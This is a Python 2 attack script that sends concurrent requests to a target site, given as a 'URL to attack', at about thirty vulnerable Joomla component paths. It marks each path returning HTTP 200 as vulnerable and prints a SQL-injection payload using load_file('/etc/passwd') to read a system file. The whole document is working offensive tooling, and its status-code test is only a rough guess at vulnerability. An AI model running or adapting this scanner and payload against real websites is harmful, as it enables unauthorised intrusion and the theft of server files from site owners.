#!/usr/bin/env python2

#This must be one of the first imports or else we get threading error on completion
from gevent import monkey
monkey.patch_all()
from gevent.pool import Pool
from gevent import joinall

import requests
import argparse


VULNS = ['index.php?option=com_jscalendar&view=jscalendar&task=details&ev_id=',
         'index.php?option=com_jedirectory&view=item&catid=',
         'index.php?option=com_jejob&view=item_detail&itemid=',
         'index.php?option=com_elite_experts&task=showExpertProfileDetailed&getExpertsFromCountry=&language=ru&id=',
         'index.php?option=com_ezautos&Itemid=49&id=1&task=helpers&firstCode=',
         'index.php?option=com_jgen&task=view&id=',
         'index.php?option=com_zoomportfolio&view=portfolio&view=portfolio&id=',
         'index.php?option=com_fabrik&view=table&tableid=',
         'index.php?option=com_zina&view=zina&Itemid=',
         'index.php?option=com_ongallery&task=ft&id=',
         'index.php?option=com_equipment&view=details&id=',
         'index.php?option=com_amblog&view=amblog&catid=',
         'index.php?option=com_yellowpages&cat=',
         'index.php?option=com_neorecruit&task=offer_view&id=',
         'index.php?option=com_beamospetition&startpage=3&pet=',
         'index.php?option=com_simpleshop&Itemid=23&task=viewprod&id=',
         'index.php?option=com_ttvideo&task=video&cid=',
         'index.php?option=com_youtube&id_cate=',
         'index.php?option=com_oziogallery&Itemid=',
         'index.php?option=com_iproperty&view=agentproperties&id=',
         'index.php?option=com_huruhelpdesk&view=detail&cid[0]=',
         'index.php?option=com_spa&view=spa_read_more&pid=',
         'index.php?option=com_staticxt&staticfile=test.php&id=',
         'index.php?option=com_spa&view=spa_product&cid=',
         'index.php?option=com_qcontacts&Itemid=',
         'index.php?option=com_redshop&view=product&pid=',
         'index.php?option=com_jpodium&view=races&Itemid=',
         'index.php?option=com_phocagallery&view=categories&Itemid=',
         'index.php?option=com_gamesbox&view=consoles&layout=console&id=',
         'index.php?option=com_ybggal&Itemid=1&catid=']

def parse_args():
    ''' Create the arguments '''
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL to attack; http://example.com or http://example.com:8080")
    return parser.parse_args()

def action(url):
    ''' Make the payloaded request and check the response's headers for the echo msg'''
    ua = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0'}

    try:
        req = requests.get(url, timeout=10, headers = ua)
    except Exception as e:
        print '[-] '+url
        return
    if req.status_code != 200:
        print '[-] '+url
    else:
        exploit = "-1+UNION+SELECT+load_file('/etc/passwd')"
        print '[+] VULNERABLE: '+url
        print '           Try: '+url+exploit

def concurrency(urls):
    ''' Open all the greenlet threads '''
    in_parallel = 100
    pool = Pool(in_parallel)
    jobs = [pool.spawn(action, url) for url in urls]
    return joinall(jobs)

def main():
    args = parse_args()
    print '[*] Testing URLs'
    urls = [args.url +'/'+vuln for vuln in VULNS]
    concurrency(urls)

main()
